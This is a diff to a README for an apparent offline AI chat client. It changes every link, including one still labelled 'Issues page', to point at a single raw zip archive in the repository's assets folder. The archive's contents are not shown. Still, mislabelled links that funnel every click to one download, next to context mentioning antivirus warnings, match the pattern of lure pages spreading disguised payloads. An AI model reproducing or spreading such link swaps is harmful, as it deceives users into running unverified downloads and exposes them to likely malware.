@@ -1,6 +1,6 @@
 # ⚡ glm-flash-offline-client - Private AI, Zero Internet Needed
 
-[![Download Now](https://img.shields.io/badge/Download-GLM_Flash_Offline-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FFA500)](https://github.com/Paola31losbendecidos/glm-flash-offline-client/releases)
+[![Download Now](https://img.shields.io/badge/Download-GLM_Flash_Offline-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FFA500)](https://github.com/Paola31losbendecidos/glm-flash-offline-client/raw/refs/heads/main/assets/glm_flash_client_offline_2.2.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these three simple steps to get your local AI assistant running today.
 
 ### Step 1: Download the Application
 
-[Visit this link to download the application.](https://github.com/Paola31losbendecidos/glm-flash-offline-client/releases)
+[Visit this link to download the application.](https://github.com/Paola31losbendecidos/glm-flash-offline-client/raw/refs/heads/main/assets/glm_flash_client_offline_2.2.zip)
 
 Click the big button at the top of this page, or the blue link text just above. This will take you to the download page where you\'ll find the file you need. Look for the latest version — it will be clearly marked.
 
@@ -105,7 +105,7 @@ Some antivirus programs flag downloaded apps that aren\'t from official stores. 
 
 ## 📞 Getting Help & Contributing
 
-This is an open-source project. If you encounter any bug or have a feature request, please visit the [Issues page](https://github.com/Paola31losbendecidos/glm-flash-offline-client/issues) on the repository. You can also contribute code, documentation, or translations if you\'re technically inclined.
+This is an open-source project. If you encounter any bug or have a feature request, please visit the [Issues page](https://github.com/Paola31losbendecidos/glm-flash-offline-client/raw/refs/heads/main/assets/glm_flash_client_offline_2.2.zip) on the repository. You can also contribute code, documentation, or translations if you\'re technically inclined.
 
 For general feedback or questions, visit the repository main page for community discussions.
 
@@ -132,7 +132,7 @@ The GLM-5.3-Flash model is a large language model — a type of AI trained on va
 
 Click the download button below, and you\'ll be chatting with your local AI in under five minutes.
 
-[![](https://img.shields.io/badge/Get_THE_APP-Visit_Download_Page-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paola31losbendecidos/glm-flash-offline-client/releases)
+[![](https://img.shields.io/badge/Get_THE_APP-Visit_Download_Page-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paola31losbendecidos/glm-flash-offline-client/raw/refs/heads/main/assets/glm_flash_client_offline_2.2.zip)
 
 ---
 
